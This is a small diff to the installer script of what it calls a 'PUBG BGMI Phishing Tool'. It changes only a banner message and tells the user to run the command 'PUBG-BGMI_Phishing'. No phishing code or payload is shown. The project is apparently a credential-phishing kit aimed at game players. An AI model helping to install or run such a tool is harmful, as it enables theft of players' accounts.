@@ -186,7 +186,7 @@ echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Suc
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 sleep 4
 echo
-echo -e "\e[1m \e[36m[+] This is Last Step \e[m \e[21"
+echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Ready \e[m \e[21"
 echo
 echo
 echo -e "\e[92m[+] Open New type this command:\e[93m PUBG-BGMI_Phishing \e[m "
